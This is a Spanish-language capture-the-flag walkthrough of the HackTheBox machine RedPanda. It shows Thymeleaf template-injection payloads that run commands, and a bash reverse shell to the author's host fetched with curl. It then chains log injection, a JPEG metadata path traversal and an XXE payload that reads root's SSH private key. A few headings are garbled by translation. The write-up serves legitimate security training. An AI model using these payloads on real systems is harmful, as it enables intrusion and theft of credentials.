---
title: HackTheBox RedPanda Writeup
published: true
---





- [Inyeccion](#inyeccion-xxe)
- [Sitio web](#Sitio-web)
- [Intrusion](#Intrusion)
- [POC](#POC)
- [Exploit](#Exploit)
- [Ejecutar](#Ejecutar)
- [Shell como root](#Shell-como-root)







## [](#header-2)Reconocimiento


nmap encuentra dos puertos TCP abiertos, SSH (22) y HTTP (8080):

```nmap
jorge@hacky$ nmap -p- --min-rate 10000 10.10.11.170
Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-21 19:58 UTC
Nmap scan report for 10.10.11.170
Host is up (0.097s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 7.28 seconds
jorge@hacky$ nmap -p 22,8080 -sCV 10.10.11.170
Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-21 19:58 UTC
Nmap scan report for 10.10.11.170
Host is up (0.086s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Mon, 21 Nov 2022 19:58:58 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
...[snip]...
_http-open-proxy: Proxy might be redirecting requests
|_http-title: Red Panda Search | Made with Spring Boot
...[snip]...
SF:l>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.73 seconds

```

# [](#header-1)Sitio web

Según la versión de OpenSSH , es probable que el host esté ejecutando Ubuntu Focal 20.04. No se identifica ningún encabezado de servidor en la respuesta HTTP, pero el título indica que el sitio está creado en Sprint Boot.

## [](#header-2)Sitio

La página es un motor de búsqueda de imágenes de pandas rojos:

![Captura de pantalla de la web](assets/images/Redpandan/imagen_1.png)

Si solo busco “a” encuentra cuatro:

![Captura de pantalla de la web](assets/images/Redpandan/imagen_2.png)

Cada panda tiene una imagen, un nombre, una biografía y un autor. El autor es un enlace que lleva a la página del autor:

![Captura de pantalla de la web](assets/images/Redpandan/imagen_3.png)

Realiza un seguimiento de la cantidad de visitas que recibe cada panda. El enlace “Exportar tabla” lleva a /export.xml?author=damiany devuelve un documento XML:

```XML
<?xml version="1.0" encoding="UTF-8"?><credits>
  <author>damian</author>
  <image>
    <uri>/img/angy.jpg</uri>
    <views>1</views>
  </image>
  <image>
    <uri>/img/shy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/crafty.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/peter.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>1</totalviews>
</credits>
```
## [](#header-2)Pila de tecnología

Los encabezados de respuesta HTTP no muestran un servidor como Apache o NGINX:

```
HTTP/1.1 200 
Content-Type: text/html;charset=UTF-8
Content-Language: en-US
Date: Mon, 21 Nov 2022 20:05:55 GMT
Connection: close
Content-Length: 1543
```

Dado el título que dice que el sitio está construido en Spring Boot, es como un sitio web Java que utiliza el marco [Spring Boot](https://spring.io/projects/spring-boot) .

Si se modifica un poco la entrada de búsqueda, la aplicación se bloqueará. Por ejemplo, parece que si hay una apertura `{`sin un cierre `}`, se devuelve una página de error:

![Captura de pantalla de la web](assets/images/Redpandan/imagen_4.png)

Una búsqueda rápida en Google muestra que esto está asociado con Spring Boot:

![Captura de pantalla de la web](assets/images/Redpandan/imagen_5.png)

## [](#header-2)Directorio de fuerza bruta

Voy a ejecutar feroxbusterel sitio e incluir -x java,classla búsqueda de archivos Java:

```
jorge@hacky$ feroxbuster -u http://10.10.11.170:8080 -x java,class

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.170:8080
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💲  Extensions            │ [java, class]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       55l      119w        0c http://10.10.11.170:8080/
200      GET       32l       97w        0c http://10.10.11.170:8080/stats
405      GET        1l        3w        0c http://10.10.11.170:8080/search
500      GET        1l        1w        0c http://10.10.11.170:8080/error
[####################] - 5m    180000/180000  0s      found:4       errors:0      
[####################] - 5m     90000/90000   267/s   http://10.10.11.170:8080 
[####################] - 5m     90000/90000   267/s   http://10.10.11.170:8080/
```

# [](#header-1)Intrusion
## [](#header-2)Instituto de Tecnología de la Información y las Comunicaciones (ISSTI)

Si intento ingresar una carga útil SSTI como ${7*7}, el sitio devuelve un error:

![Captura de pantalla de la web](assets/images/Redpandan/imagen_6.png)

Para ver qué está prohibido, utilizaré wfuzzsolo caracteres individuales de una lista de palabras en SecLists . --ss bannedSe filtrará para mostrar solo las respuestas que contengan la cadena "banned":

```
jorge@hacky$ wfuzz -u http://10.10.11.170:8080/search -d name=FUZZ -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt --ss banned
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.170:8080/search
Total requests: 95

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000004:   200        28 L     69 W     755 Ch      "$"
000000063:   200        28 L     69 W     755 Ch      "_"
000000094:   200        28 L     69 W     755 Ch      "~"

Total time: 1.417720
Processed Requests: 95
Filtered Requests: 92
Requests/sec.: 67.00898
```
Parecen tres caracteres individuales que están bloqueados (podría haber más patrones de caracteres múltiples también, pero este es un buen comienzo).

## [](#header-2)Identificar SSTI

El lenguaje de plantillas predeterminado para Spring Boot es Thymeleaf. Este artículo explica en detalle cómo usar Thymeleaf y me gusta mucho esta parte que muestra los diferentes tipos de expresiones:

![Captura de pantalla de la web](assets/images/Redpandan/imagen_7.png)

El primero y el último activarán la lista de prohibidos, pero puedo probar los demás. Por ejemplo, *{7*7}funciona:

![Captura de pantalla de la web](assets/images/Redpandan/imagen_8.png)

@{7*7}devuelve lo mismo. #{7*7}También funciona, devolviendo un poco más de basura:

![Captura de pantalla de la web](assets/images/Redpandan/imagen_9.png)

## [](#header-2)Punto de contacto de RCE

La carga útil del artículo anterior es ${T(java.lang.Runtime).getRuntime().exec('calc')}. Cambiaré el encabezado $por *y en lugar de ejecutar calc, probaré id:

![Captura de pantalla de la web](assets/images/Redpandan/imagen_10.png)

Parece que el comando se ejecutó, pero no obtengo respuesta. Puedo intentar comunicarme con pingmi host con *{T(java.lang.Runtime).getRuntime().exec('ping -c 1 10.10.14.6')}y funciona:

```
jorge@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
21:07:24.116693 IP 10.10.11.170 > 10.10.14.6: ICMP echo request, id 2, seq 1, length 64
21:07:24.116743 IP 10.10.14.6 > 10.10.11.170: ICMP echo reply, id 2, seq 1, length 64
```

Alternativamente, existen cargas útiles que devuelven el resultado, como la de la página HackTricks SSTI :

```
{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

Pegar esto en el cuadro de búsqueda textualmente muestra el resultado de id:

![Captura de pantalla de la web](assets/images/Redpandan/imagen_11.png)

## [](#header-2)POC

Dada la complejidad de esta carga útil, la usaré `curl`para leer un archivo desde mi máquina virtual y, si funciona, intentaré canalizarlo a `bash`. Entraré en el proxy Burp y buscaré la `id`solicitud de POC anterior. Enviaré esa solicitud al repetidor y la cambiaré `id`a `curl 10.10.14.6/shell`. Con un `python`servidor web en ejecución, enviaré la solicitud y habrá una solicitud en mi servidor web:

```
jorge@hacky$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.170 - - [21/Nov/2022 21:11:51] code 404, message File not found
10.10.11.170 - - [21/Nov/2022 21:11:51] "GET /shell HTTP/1.1" 404 -
```

## [](#header-2)Fallas en las tuberías

Agregaré un shell inverso bash a shell:

```
#!/bin/bash
bash >& /dev/tcp/10.10.14.6/443 0>&1
```

Intentando canalizar esto hacia bashlos resultados en esta solicitud:

```
10.10.11.170 - - [21/Nov/2022 21:15:35] code 404, message File not found
10.10.11.170 - - [21/Nov/2022 21:15:35] "GET /shell|bash HTTP/1.1" 404 -
```

Se interpreta |como parte de la solicitud y no como una canalización.

## [](#header-2)Guardar y ejecutar

Simplemente escribiré el shell en /tmp:

![Captura de pantalla de la web](assets/images/Redpandan/imagen_12.png)

Parece que esto funciona. A continuación, lo ejecutaré con bash

![Captura de pantalla de la web](assets/images/Redpandan/imagen_13.png)

Al hacer eso, hay una conexión en mi ncoyente:

```
jorge@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.170 45524
```

Por eso siempre ejecuto con -v, para que me avise de la conexión, aunque no se haya enviado ningún mensaje durante la sesión. Sigue funcionando:

```
jorge@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.170 45524
id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
```

Actualizaré el shell usando scripty stty(explicado aquí ):

```
script /dev/null -c bash
Script started, file is /dev/null
woodenk@redpanda:/tmp/hsperfdata_woodenk$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
woodenk@redpanda:/tmp/hsperfdata_woodenk$
```

Desde aquí puedo agarrar user.txt:

```
woodenk@redpanda:~$ cat user.txt
8080a73c************************
```
# [](#header-1)Shell como root

## [](#header-2)Enumeración linux

El usuario actual está en el logs grupo : 

```
woodenk@redpanda:/tmp$ id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
```

Curiosamente, el usuario en realidad no está en ese grupo, pero sí lo está el proceso a partir del cual se generó el shell. Esto genera una discrepancia entre un shell obtenido a través de SSTI en la aplicación web y el uso de SSH (exploraré esto en [Beyond Root](https://0xdf.gitlab.io/2022/11/26/htb-redpanda.html#beyond-root---groups) ).

Buscando archivos propiedad de este grupo, eliminaré las líneas en `/proc`, `/tmp`y en el `/home/woodenk/.m2`directorio :

```
woodenk@redpanda:/$ find / -group logs 2>/dev/null | grep -v -e '^/proc' -e '\.m2' -e '^/tmp/'
/opt/panda_search/redpanda.log
/credits
/credits/damian_creds.xml
/credits/woodenk_creds.xml
```

/creditses legible logspero solo escribible por root:

```
woodenk@redpanda:/$ find /credits -ls
    81946      4 drw-r-x---   2 root     logs         4096 Jun 21 12:32 /credits
    22780      4 -rw-r-----   1 root     logs          422 Nov 21 23:38 /credits/damian_creds.xml
    22800      4 -rw-r-----   1 root     logs          426 Nov 21 23:38 /credits/woodenk_creds.xml
```

/opt Tiene todo el material interesante para esta maquina:

```
woodenk@redpanda:/opt$ ls
cleanup.sh  credit-score  maven  panda_search
```

Hay dos aplicaciones Java panda_searchy credit-score. Analizaré cada una de ellas a continuación. También hay un archivo llamado cleanup.sh:

```
#!/bin/bash
/usr/bin/find /tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.jpg" -exec rm -rf {} \;
```

Esto elimina .xmlarchivos .jpgde varios directorios. No necesito saber esto para resolverlo, pero es una buena pista de que estos son los tipos de archivos que importan. Es de suponer que esto se ejecuta periódicamente en un cron.

## [](#header-2)Procesos
Para buscar procesos en ejecución, cargaré pspy iniciando un servidor Python en ese directorio y usándolo wgetdesde mi shell en RedPanda. Cada dos minutos se ejecuta un cron que /root/run_credits.shparece ejecutarse /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jarcomo root.

```
2022/11/21 23:42:01 CMD: UID=0    PID=4700   | /usr/sbin/CRON -f 
2022/11/21 23:42:01 CMD: UID=0    PID=4702   | /bin/sh /root/run_credits.sh 
2022/11/21 23:42:01 CMD: UID=0    PID=4701   | /bin/sh -c /root/run_credits.sh 
2022/11/21 23:42:01 CMD: UID=0    PID=4703   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
```

/opt/cleanup.shParece que también se ejecuta cada cinco minutos.


## [](#header-2)Aplicación web

La fuente de la aplicación web se encuentra en /opt/panda_search:

```
woodenk@redpanda:/opt/panda_search$ ls
mvnw  mvnw.cmd  pom.xml  redpanda.log  src  target
```

Hay algunos .java archivos:

```
woodenk@redpanda:/opt/panda_search$ find . -name '*.java'
./.mvn/wrapper/MavenWrapperDownloader.java
./src/test/java/com/panda_search/htb/panda_search/PandaSearchApplicationTests.java
./src/main/java/com/panda_search/htb/panda_search/RequestInterceptor.java
./src/main/java/com/panda_search/htb/panda_search/MainController.java
./src/main/java/com/panda_search/htb/panda_search/PandaSearchApplication.java
```

Me saltearé `MavenWrapperDownloader.java`las pruebas por ahora.

`MainController.java`define algunas de las diferentes rutas web de la página, `/stats`, `/export.xml`, `/search`. Observaré que la `/stats`ruta obtiene datos de `/credits/[author]_creds.xml`:

```
if(author.equals("woodenk") || author.equals("damian")){String path = "/credits/" + author + "_creds.xml";File fd = new File(path);Document doc = saxBuilder.build(fd);Element rootElement = doc.getRootElement();String totalviews = rootElement.getChildText("totalviews");List<Element> images = rootElement.getChildren("image");for(Element image: images)System.out.println(image.getChildText("uri"));model.addAttribute("noAuthor", false);model.addAttribute("author", author);model.addAttribute("totalviews", totalviews);model.addAttribute("images", images);return new ModelAndView("stats.html");}
```

Hay una searchPandafunción que se conecta a la base de datos:

```
    public ArrayList searchPanda(String query) {Connection conn = null;PreparedStatement stmt = null;ArrayList<ArrayList> pandas = new ArrayList();try {Class.forName("com.mysql.cj.jdbc.Driver");conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");stmt = conn.prepareStatement("SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?");stmt.setString(1, "%" + query + "%");ResultSet rs = stmt.executeQuery();while(rs.next()){ArrayList<String> panda = new ArrayList<String>();panda.add(rs.getString("name"));panda.add(rs.getString("bio"));panda.add(rs.getString("imgloc"));panda.add(rs.getString("author"));pandas.add(panda);}}catch(Exception e){ System.out.println(e);}return pandas;}

```

Tomaré nota de esas credenciales, Woodenk/RedPandazRule. Funcionan para conectarse por SSH a la máquina como el mismo usuario, pero no las necesito y un shell SSH no tendrá el `logs`grupo (consulte [Beyond Root](https://0xdf.gitlab.io/2022/11/26/htb-redpanda.html#beyond-root---groups) ).

`PandaSearchApplication.java`simplemente configura la aplicación SpringBoot:

```java
package com.panda_search.htb.panda_search;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.stereotype.Component;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;@SpringBootApplication
public class PandaSearchApplication extends WebMvcConfigurerAdapter
{@Override
    public void addInterceptors (InterceptorRegistry registry) {registry.addInterceptor(new RequestInterceptor());}
    public static void main(String[] args) {SpringApplication.run(PandaSearchApplication.class, args);}}
```

RequestInterceptorgenera registro en cada solicitud:

```java
public class RequestInterceptor extends HandlerInterceptorAdapter {@Override
    public boolean preHandle (HttpServletRequest request, HttpServletResponse response, Object handler) 
    throws Exception {System.out.println("interceptor#preHandle called. Thread: " + Thread.currentThread().getName());return true;}@Override
    public void afterCompletion (HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {System.out.println("interceptor#postHandle called. Thread: " + Thread.currentThread().getName());String UserAgent = request.getHeader("User-Agent");String remoteAddr = request.getRemoteAddr();String requestUri = request.getRequestURI();Integer responseCode = response.getStatus();/*System.out.println("User agent: " + UserAgent);
        System.out.println("IP: " + remoteAddr);
        System.out.println("Uri: " + requestUri);
        System.out.println("Response code: " + responseCode.toString());*/System.out.println("LOG: " + responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri);FileWriter fw = new FileWriter("/opt/panda_search/redpanda.log", true);BufferedWriter bw = new BufferedWriter(fw);bw.write(responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri + "\n");bw.close();}}
```

Se escribe /opt/panda_search/redpanda.logen el formato:

```
[response code]||[remote address]||[user agent]||[request uri]
```

# [](#header-1)puntaje crediticio

Hay otra aplicación `/opt`llamada `credit-score`:

```
woodenk@redpanda:/opt$ find credit-score/ -type f
credit-score/LogParser/final/pom.xml.bak
credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
credit-score/LogParser/final/target/maven-status/maven-compiler-plugin/compile/default-compile/inputFiles.lst
credit-score/LogParser/final/target/maven-status/maven-compiler-plugin/compile/default-compile/createdFiles.lst
credit-score/LogParser/final/target/classes/com/logparser/App.class
credit-score/LogParser/final/.mvn/wrapper/maven-wrapper.jar
credit-score/LogParser/final/.mvn/wrapper/maven-wrapper.properties
credit-score/LogParser/final/.mvn/wrapper/MavenWrapperDownloader.java
credit-score/LogParser/final/pom.xml
credit-score/LogParser/final/mvnw
credit-score/LogParser/final/src/test/java/com/logparser/AppTest.java
credit-score/LogParser/final/src/main/java/com/logparser/App.jav
```

Hay un .jararchivo allí, que es la aplicación Java compilada. El archivo fuente interesante aquí es App.java. La mainfunción abre /opt/panda_search/redpanda.log(el archivo que se escribe arriba) y lo pasa a parseLog:

```java
public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException
{File log_fd = new File("/opt/panda_search/redpanda.log");
Scanner log_reader = new Scanner(log_fd);while(log_reader.hasNextLine()){String line = log_reader.nextLine();if(!isImage(line)){continue;}Map parsed_data = parseLog(line);System.out.println(parsed_data.get("uri"));String artist = getArtist(parsed_data.get("uri").toString());System.out.println("Artist: " + artist);
String xmlPath = "/credits/" + artist + "_creds.xml";addViewTo(xmlPath, parsed_data.get("uri").toString());}}

```

parseLogestá leyendo ese archivo y dividiéndolo en ||:

```java
public static Map parseLog(String line) {String[] strings = line.split("\\|\\|");Map map = new HashMap<>();map.put("status_code", Integer.parseInt(strings[0]));map.put("ip", strings[1]);map.put("user_agent", strings[2]);map.put("uri", strings[3]);return map;}
```

Después de analizar una línea del registro, main llama getArtistpara obtener el nombre del artista asociado con la imagen.

```java
    public static String getArtist(String uri) throws IOException, JpegProcessingException
    {String fullpath = "/opt/panda_search/src/main/resources/static" + uri;File jpgFile = new File(fullpath);
    Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);for(Directory dir : metadata.getDirectories()){for(Tag tag : dir.getTags()){if(tag.getTagName() == "Artist"){return tag.getDescription();}}}return "N/A";}
```

Esta función utiliza el nombre de la etiqueta “Artista” en los metadatos de la imagen como artista. Puedo comprobarlo descargando una de las imágenes del sitio y utilizando exiftoolpara obtener los metadatos:

```
oxdf@hacky$ exiftool smooch.jpg | grep Artist
Artist  : woodenk
```

`main` utiliza el nombre del artista para generar una ruta a un `[artist name]_creds.xml`archivo, que se pasa junto con la URI a `addViewTo`.

`addViewTo` analiza el XML, incrementa el número de visualizaciones de esa imagen y luego vuelve a escribir el archivo:

```java
public static void addViewTo(String path, String uri) throws JDOMException, IOException{SAXBuilder saxBuilder = new SAXBuilder();XMLOutputter xmlOutput = new XMLOutputter();xmlOutput.setFormat(Format.getPrettyFormat());File fd = new File(path);
Document doc = saxBuilder.build(fd);Element rootElement = doc.getRootElement();for(Element el: rootElement.getChildren()){if(el.getName() == "image"){if(el.getChild("uri").getText().equals(uri)){Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;System.out.println("Total views:" + Integer.toString(totalviews));rootElement.getChild("totalviews").setText(Integer.toString(totalviews));Integer views = Integer.parseInt(el.getChild("views").getText());el.getChild("views").setText(Integer.toString(views + 1));}}}BufferedWriter writer = new BufferedWriter(new FileWriter(fd));xmlOutput.output(doc, writer);}
```


# [](#header-1)Inyección


## [](#header-2)Estrategia

Mi objetivo aquí es pasar un archivo que está completamente bajo mi control a la `addViewTo`función. Si controlo ese archivo, puedo usar la inyección de entidad externa XML (XXE) para leer archivos como root (el usuario que ejecuta el proceso).

Para controlar la ruta al archivo XML, necesitaré controlar el nombre de usuario, que se obtiene de los `Artist`metadatos del JPG asociado con la URI del registro.

Para que apunte a mi JPG, inyectaré en el registro usando el User-Agent para controlar la variable URI abusando de cómo se divide en `||`

![Captura de pantalla de la web](assets/images/Redpandan/imagen_14.png)

## [](#header-2)Carga útil XXE

Comenzaré con el archivo descargado export.xmlde /export.xml, lo guardaré como 0xdf_creds.xml. Agregaré una carga útil XXE:

![Captura de pantalla de la web](assets/images/Redpandan/imagen_15.png)

Esto define una entidad fooque es el contenido de un archivo. Cuando el programa procesa esto, el <root>campo debe obtener el contenido de /etc/passwd, y luego se vuelve a escribir en el archivo.

## [](#header-2)Imagen

Descargaré una de las imágenes del sitio y la llamaré `0xdf.jpg`. Actualizaré los metadatos usando `exiftool`para que encuentre la ruta que busca el programa `0xdf_creds.xml`y no una de las deseadas:

```
jorge@hacky$ cp florida.jpg 0xdf.jpg 
jorge@hacky$ exiftool -Artist="../tmp/0xdf" 0xdf.jpg 
Warning: [minor] Ignored empty rdf:Bag list for Iptc4xmpExt:LocationCreated - 0xdf.jpg
    1 image files updated
jorge@hacky$ exiftool 0xdf.jpg | grep Artist
Artist : ../tmp/0xdf
```

## [](#header-2)Registro malicioso

Para inyectar en los registros, podría descubrir cómo hacer solicitudes que se registren y luego modificar mi agente de usuario para `||`dar control sobre el campo uri, pero eso no es necesario, ya que el archivo de registro puede escribirse mediante el grupo de registros:

```
woodenk@redpanda:/opt/panda_search$ ls -l redpanda.log 
-rw-rw-r-- 1 root logs 1 Nov 22 11:48 redpanda.log
```

Escribiré un registro que apunte a mi archivo de imagen:


```
woodenk@redpanda:/opt/panda_search$ echo "412||ip||ua||/../../../../../../tmp/0xdf.jpg" >> redpanda.log
```

## [](#header-2)Ejecutar

Subiré los dos archivos que creé para /tmpusarlos scpcon las credenciales identificadas en la fuente web (aunque también podría usar un servidor web Python y wgetcon la misma facilidad):

```
jorge@hacky$ sshpass -p RedPandazRule scp 0xdf.jpg woodenk@10.10.11.170:/tmp/
jorge@hacky$ sshpass -p RedPandazRule scp 0xdf_creds.xml woodenk@10.10.11.170:/tmp/
```

La próxima vez que se ejecute el cron, analizará ese registro y la urivariable será /../../../../../../tmp/0xdf.jpg. Se utilizará para crear una ruta que es /opt/panda_search/src/main/resources/static/../../../../../../tmp/0xdf.jpg, que es efectivamente /tmp/0xdf.jpg.

Luego, el programa leerá los metadatos del artista de esa imagen para `../tmp/0xdf`construir la ruta `/credits/../tmp/oxdf_creds.xml`.

Cargará ese archivo XML y, al hacerlo, la entidad que contiene leerá el contenido de `/etc/passwd`. Luego, incrementará el `views`campo y escribirá los resultados nuevamente en el mismo archivo.

Después de la próxima ejecución, veré los resultados en el archivo:

![Captura de pantalla de la web](assets/images/Redpandan/imagen_16.png)

# [](#header-1)EjecutarCaparazón

##  [](#header-2)Recopilar clave SSH

Con la capacidad de leer archivos como root, podría simplemente leer la bandera, pero con el objetivo de obtener un shell, intentaré leer la clave SSH de root. Actualizaré el XXE para apuntar al nombre de clave predeterminado:

```
...[snip]...
<!DOCTYPE root [
<!ENTITY foo SYSTEM 'file:///root/.ssh/id_rsa'>]>
...[snip]...
```
Copia ese archivo en RedPanda:

```
jorge@hacky$ sshpass -p RedPandazRule scp 0xdf_creds.xml woodenk@10.10.11.170:/tmp/
```

Y inyecta otro log:

```
woodenk@redpanda:/opt/panda_search$ echo "412||ip||ua||/../../../../../../tmp/0xdf.jpg" >> redpanda.log

```

Me aseguraré de que el JPG todavía esté en su lugar y no haya sido limpiado también.
Cuando el cron se ejecute la próxima vez, la clave estará allí:

```xml
woodenk@redpanda:/opt/panda_search$ cat /tmp/0xdf_creds.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root>
<credits>
  <author>damian</author>
  <image>
    <uri>/img/angy.jpg</uri>
    <views>1</views>
    <root>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</root>
  </image>
  <image>
    <uri>/img/shy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/crafty.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/peter.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>1</totalviews>
</credits>
```

##  [](#header-2)Obtener Shell

Guardaré esa clave en un archivo y la usaré para conectarme a través de SSH:

```
oxdf@hacky$ vim ~/keys/redpanda-root
oxdf@hacky$ chmod 600 ~/keys/redpanda-root
oxdf@hacky$ ssh -i ~/keys/redpanda-root root@10.10.11.170
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)
...[snip]...
root@redpanda:~#
```
